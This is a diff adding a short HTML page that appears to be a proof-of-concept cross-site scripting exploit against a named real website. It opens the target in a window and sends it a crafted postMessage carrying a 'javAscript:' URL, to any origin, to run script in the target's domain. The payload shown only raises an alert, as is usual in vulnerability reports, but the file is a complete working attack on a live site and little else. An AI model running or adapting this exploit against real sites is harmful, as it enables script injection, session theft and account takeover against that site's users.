@@ -1,0 +1,28 @@
+<html>
+
+<body>
+
+    <button onclick="open_ooredoo_qa()">click me to open www.ooredoo.qa</button>
+    <button onclick="simple_alert()">click me for simple xss</button>
+    <script>
+        async function open_ooredoo_qa() {
+
+            win_attcker = window.open("https://www.ooredoo.qa/?ctActionMode=ctBuilder");
+
+        }
+
+        function simple_alert() {
+            win_attcker.postMessage({
+                "originUrl": "https://jassertoubib.github.io",
+                "url": "javAscript:alert(document.domain)//",
+                "variant": true,
+                "message": "Dashboard",
+                "evtMaster": [{}],
+                "details": "test",
+                "personalisation": "test"
+            }, "*")
+        }
+    </script>
+</body>
+
+</html>
